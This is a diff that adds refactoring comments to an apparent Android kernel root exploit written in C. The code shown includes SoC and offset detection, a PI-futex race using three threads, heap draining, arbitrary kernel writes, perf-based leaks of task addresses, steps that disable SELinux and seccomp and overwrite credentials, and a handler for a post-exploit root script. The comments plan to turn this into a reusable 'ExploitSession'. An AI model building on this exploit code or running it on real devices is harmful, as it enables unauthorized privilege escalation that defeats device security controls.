@@ -30,6 +30,9 @@ enum soc_family {
   SOC_XRING,
 };
 
+/* Decoupling plan: detect the SoC address-mapping family. Input: captured
+ * property source; output: soc_family. Future: runtime_config_detect_soc(),
+ * called once while building RuntimeConfig. */
 static enum soc_family detect_soc(void) {
   char buf[256];
   const char *keys[] = {"ro.soc.manufacturer", "ro.soc.model",
@@ -99,6 +102,9 @@ static enum soc_family detect_soc(void) {
 static struct kernel_offsets g_external_offsets;
 static char g_external_release[192];
 
+/* Decoupling plan: validate common and chain-specific target metadata. Input:
+ * candidate profile; output: structured validation result. Future:
+ * target_profile_validate(const TargetProfile *, ValidationError *). */
 static int validate_offsets_profile(const struct kernel_offsets *entry) {
   if (!entry || !entry->uname_r || !entry->off_init_task ||
       !entry->off_init_cred || !entry->off_root_task_group ||
@@ -157,6 +163,9 @@ static int validate_offsets_profile(const struct kernel_offsets *entry) {
 
 /* Entries carry a phys load address only when measured; otherwise MTK uses
  * the DRAM base, xring its constant, qcom its GKI version. */
+/* Decoupling plan: publish derived addresses for the selected profile. Inputs:
+ * profile and RuntimeConfig; output: ResolvedAddresses. Future:
+ * resolve_runtime_addresses(), without modifying process globals. */
 static void publish_active_offsets(void) {
   g_init_cred_image = INIT_CRED;
   enum soc_family soc = detect_soc();
@@ -185,6 +194,9 @@ static void publish_active_offsets(void) {
  * built-in table, the entry starts from the built-in values so fields the
  * JSON leaves empty keep the built-in ones instead of falling back to
  * target.h defaults. */
+/* Decoupling plan: load and merge an external profile for one release. Inputs:
+ * path/config, release and built-in fallback; output: TargetProfile/result.
+ * Future: target_profile_load_external(), without activating global state. */
 static int try_external_offsets(const char *release) {
   char path[320];
   snprintf(path, sizeof(path), "%s/offsets.json", g_home_dir);
@@ -212,6 +224,9 @@ static int try_external_offsets(const char *release) {
   }
   return rc;
 }
+/* Decoupling plan: select, validate and resolve the active profile. Inputs:
+ * runtime release/config; output: immutable TargetProfile. Future: split into
+ * target_profile_select() and resolve_runtime_addresses(). */
 static int select_offsets(void) {
   struct utsname uts;
   if (uname(&uts) < 0) return -1;
@@ -246,7 +261,11 @@ static int select_offsets(void) {
 }
 
 static struct timespec t0;
+/* Decoupling plan: reset top-level elapsed time. Input/output: implicit timer;
+ * future: exploit_timeline_start(ExploitTimeline *). */
 static void timer_reset(void) { clock_gettime(CLOCK_MONOTONIC, &t0); }
+/* Decoupling plan: read top-level elapsed time. Input: timeline reference;
+ * output: milliseconds. Future: exploit_timeline_elapsed(const timeline *). */
 static double timer_ms(void) {
   struct timespec now;
   clock_gettime(CLOCK_MONOTONIC, &now);
@@ -279,6 +298,10 @@ atomic_int main_route_delay_usec;
 static atomic_int fast_repair_route;
 int memfd_leak;
 
+/* Decoupling plan: run the shared PI waiter and delegate route execution.
+ * Input: currently implicit race/session state; output: completion/status.
+ * Future: pi_race_waiter_worker(void *PiRaceWorkerArgs); route dispatch moves
+ * to the stage controller. */
 void *waiter_thread(void *arg __attribute__((unused))) {
   disable_rseq_for_thread();
   int tid = (int)syscall(SYS_gettid);
@@ -323,6 +346,8 @@ void *waiter_thread(void *arg __attribute__((unused))) {
   return NULL;
 }
 
+/* Decoupling plan: own the target and chain PI futexes. Input: PiRaceContext;
+ * output: synchronization state. Future: pi_race_owner_worker(void *context). */
 void *owner_thread(void *arg __attribute__((unused))) {
   disable_rseq_for_thread();
   long lock_target = futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
@@ -337,6 +362,9 @@ void *owner_thread(void *arg __attribute__((unused))) {
   return NULL;
 }
 
+/* Decoupling plan: trigger PI traversal from the consumer CPU. Inputs:
+ * PiRaceContext, TargetProfile and RuntimeConfig; output: attempt counters.
+ * Future: pi_race_consumer_worker(void *PiRaceWorkerArgs). */
 void *consumer_thread(void *arg __attribute__((unused))) {
   disable_rseq_for_thread();
   pin_to_core(CONSUMER_CORE);
@@ -388,6 +416,8 @@ void *consumer_thread(void *arg __attribute__((unused))) {
   return NULL;
 }
 
+/* Decoupling plan: reset one PI race attempt. Input/output: PiRaceContext;
+ * output: initialized synchronization state. Future: pi_race_reset(). */
 void reset_main_route_state(void) {
   f_wait = 0; f_pi_target = 0; f_pi_chain = 0;
   atomic_store(&waiter_ready, 0); atomic_store(&waiter_waiting, 0);
@@ -403,6 +433,9 @@ void reset_main_route_state(void) {
   route_last_step = 0; route_last_errno = 0;
 }
 
+/* Decoupling plan: create, synchronize and join one PI race. Inputs: race and
+ * selected route contexts; output: RouteStatus. Future: pi_race_run(), with
+ * partial-thread-start cleanup and no route_last_* globals. */
 int run_main_route_threads(void) {
   reset_main_route_state();
   pthread_t waiter, owner, consumer;
@@ -436,6 +469,9 @@ int run_main_route_threads(void) {
          atomic_load(&consumer_success) > 0 && route_last_step == 0;
 }
 
+/* Decoupling plan: prepare payload and execute one abstract kernel write.
+ * Inputs: session and immutable WriteRequest; output: RouteStatus. Future:
+ * exploit_execute_write(session, request), separating heap and route phases. */
 static int do_one_write(uintptr_t target, const char *desc, int mode, int leaf) {
   pr_info("=== %s === target=0x%016zx mode=%d leaf=%d\n", desc, target, mode, leaf);
   /* Both transports write *(target) := value through the erase left-only
@@ -505,6 +541,9 @@ static int process_has_seccomp(void) {
   return seccomp != 0;
 }
 
+/* Decoupling plan: apply the pre-attempt slab-drain policy. Input: HeapContext
+ * and policy; output: status only. Future: heap_context_drain(), with all
+ * temporary children owned and reaped by the context. */
 static void slab_drain(void) {
   /* Keep this light in untrusted_app. Aggressive fork storms trip LMK/OOM
    * (exit 137) especially right before heap spray. */
@@ -538,6 +577,8 @@ static void slab_drain(void) {
 int g_core_main = 0;
 int g_core_consumer = 1;
 
+/* Decoupling plan: choose main and consumer CPUs. Input: environment/sysfs;
+ * output: RuntimeConfig. Future: runtime_config_init_cpu(), called once. */
 void init_cpu_config(void) {
   g_core_main = 0;
   g_core_consumer = 1;
@@ -584,6 +625,8 @@ void init_cpu_config(void) {
   pr_info("cpu pair: main=%d consumer=%d\n", g_core_main, g_core_consumer);
 }
 
+/* Decoupling plan: capture working and root-script paths. Input: environment;
+ * output: RuntimeConfig path fields. Future: runtime_config_init_paths(). */
 static void init_runtime_paths(void) {
   const char *home = getenv("GHOSTLOCK_HOME");
   if (!home || !home[0]) home = getenv("TMPDIR");
@@ -599,6 +642,9 @@ static void init_runtime_paths(void) {
   pr_info("runtime home=%s script=%s\n", g_home_dir, g_root_script_path);
 }
 
+/* Decoupling plan: materialize the post-exploit handoff script. Input: const
+ * RuntimeConfig; output: file operation result. Future: handoff_script_write(),
+ * returning errors rather than modifying exploit state. */
 static void write_root_script(void) {
   char script[8192];
   int sfd = open(g_root_script_path, O_WRONLY | O_CREAT | O_TRUNC, 0755);
@@ -774,6 +820,9 @@ static int kernelsu_module_loaded(void) {
 }
 
 /* Find a task through perf sample records. */
+/* Decoupling plan: discover a victim task address via perf samples. Inputs:
+ * VictimContext/profile; output: address/error. Future:
+ * victim_discover_task(VictimContext *, uintptr_t *). */
 static uintptr_t perf_find_task(void) {
   struct perf_event_attr pe;
   memset(&pe, 0, sizeof(pe));
@@ -847,6 +896,9 @@ struct child_pipes { int task_r, task_w, cmd_r, cmd_w, uid_r, uid_w; };
 
 /* rooted exits kfree the static init_cred (w2 stores it with no
  * get_cred). park forever, oom_score_adj -1000 so lmkd skips us. */
+/* Decoupling plan: retain a rooted child that references the credential.
+ * Input: VictimContext policy; output: non-returning parked state. Future:
+ * victim_park_rooted_child(const VictimContext *). */
 static void park_rooted_child(void) {
   FILE *f = fopen("/proc/self/oom_score_adj", "w");
   if (f) {
@@ -856,6 +908,9 @@ static void park_rooted_child(void) {
   for (;;) pause();
 }
 
+/* Decoupling plan: execute the victim command protocol and root handoff.
+ * Input: owned pipe endpoints plus runtime config; output: reports/child exit.
+ * Future: victim_child_run(VictimContext *), with explicit fd ownership. */
 static void child_main(struct child_pipes *p) {
   close(p->task_r); close(p->cmd_w); close(p->uid_r);
   setpgid(0, 0);  /* own group; the parent kills the whole tree on timeout */
@@ -965,6 +1020,8 @@ static void child_main(struct child_pipes *p) {
   park_rooted_child();
 }
 
+/* Decoupling plan: create the victim process and pipe protocol. Input/output:
+ * VictimContext; output: owned PID/error. Future: victim_context_spawn(). */
 static pid_t spawn_child(struct child_pipes *p) {
   int p1[2], p2[2], p3[2];
   if (pipe(p1) < 0 || pipe(p2) < 0 || pipe(p3) < 0) return -1;
@@ -979,6 +1036,9 @@ static pid_t spawn_child(struct child_pipes *p) {
 }
 
 /* Fork the victim and read back the task pointer perf leaked. */
+/* Decoupling plan: spawn a victim and obtain its task address. Inputs:
+ * VictimContext/output address; output: PID/error. Future:
+ * victim_context_prepare(VictimContext *, uintptr_t *). */
 static pid_t spawn_victim(struct child_pipes *p, uintptr_t *task_out) {
   pid_t child = spawn_child(p);
   if (child < 0) return -1;
@@ -991,6 +1051,10 @@ static pid_t spawn_victim(struct child_pipes *p, uintptr_t *task_out) {
 
 typedef int (*write_stage_verify_fn)(void *context);
 
+/* Decoupling plan: run retry, repair and verification policy for one W stage.
+ * Inputs: ExploitSession, StageDescriptor and verify callback; output:
+ * StageStatus. Future: exploit_stage_run(), while route execution remains
+ * single-attempt and route-neutral. */
 static int retry_write_stage(
     const char *stage, uintptr_t target, int mode, int attempts,
     useconds_t settle_usec, write_stage_verify_fn verify, void *context,
@@ -1048,6 +1112,8 @@ static int retry_write_stage(
   return verify(context);
 }
 
+/* Decoupling plan: verify the SELinux stage. Input: verification context;
+ * output: boolean/status. Future: stage_verify_selinux(const StageContext *). */
 static int verify_selinux_stage(void *context) {
   (void)context;
   if (!check_selinux_off()) return 0;
@@ -1064,6 +1130,8 @@ struct w3_stage_context {
   int leaf_to_target8; /* 1: leaf write lands on [target+8], 0: [target] */
 };
 
+/* Decoupling plan: verify victim credentials through its protocol. Input:
+ * W2 context; output: boolean/status. Future: stage_verify_credentials(). */
 static int verify_w2_stage(void *context) {
   struct w2_stage_context *stage = context;
   if (write(stage->pipes->cmd_w, "C", 1) != 1) return 0;
@@ -1079,6 +1147,8 @@ static int verify_w2_stage(void *context) {
   return 1;
 }
 
+/* Decoupling plan: verify the victim seccomp stage. Input: victim context;
+ * output: boolean/status. Future: stage_verify_seccomp(). */
 static int verify_seccomp_probe_stage(void *context) {
   struct w2_stage_context *stage = context;
   if (write(stage->pipes->cmd_w, "F", 1) != 1) return 0;
@@ -1100,6 +1170,9 @@ static int verify_seccomp_probe_stage(void *context) {
   return 1;
 }
 
+/* Decoupling plan: determine select-stack leaf write direction. Input: W3
+ * context; output: verified direction/status. Future:
+ * select_stack_verify_leaf_direction(), storing result in its route context. */
 static int verify_leaf_dir_stage(void *context) {
   struct w3_stage_context *stage = context;
   if (write(stage->pipes->cmd_w, "M", 1) != 1) return 0;
@@ -1130,6 +1203,10 @@ static int verify_leaf_dir_stage(void *context) {
   return 0;
 }
 
+/* Decoupling plan: top-level lifecycle and W1/W2/W3 orchestration. Inputs:
+ * argv/environment snapshot; output: stable process exit code. Future:
+ * exploit_session_run(ExploitSession *), delegating profile, heap, race, route,
+ * victim and cleanup responsibilities to their contexts. */
 int run_exploit(int argc, char **argv) {
   (void)argc; (void)argv;
   disable_rseq_for_thread();
@@ -1508,4 +1585,6 @@ int run_exploit(int argc, char **argv) {
   return 0;
 }
 
+/* Decoupling plan: native executable adapter. Inputs: argc/argv; output: stable
+ * exit code. Future: remain a thin adapter around ExploitSession lifecycle. */
 int main(int argc, char **argv) { return run_exploit(argc, argv); }
